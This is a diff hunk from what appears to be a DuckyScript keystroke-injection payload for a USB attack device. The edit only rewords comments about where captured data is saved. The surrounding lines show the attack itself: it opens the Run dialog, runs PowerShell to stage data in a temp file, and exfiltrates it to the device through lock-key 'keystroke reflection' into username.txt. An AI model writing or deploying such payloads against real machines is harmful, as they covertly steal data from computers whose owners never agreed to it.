@@ -21,7 +21,7 @@ STRING $o+='%{SCROLLLOCK}'; $o > $env:tmp\y.txt"
 ENTER
 DELAY 100
 
-REM enable keystroke reflection, save incoming data into username.txt
+REM enable keystroke reflection
 KEYREFLECT_START
 
 GUI r
@@ -31,7 +31,7 @@ STRING powershell "$o = cat $env:tmp\y.txt; Add-Type -As System.Windows.Forms; [
 ENTER
 DELAY 100
 
-REM wait until host is done sending all bits for keystroke reflection
+REM wait until host is done sending all data bits and save the data into username.txt
 KEYREFLECT_SAVE username.txt
 
 REM turn all LED's off after payload completion
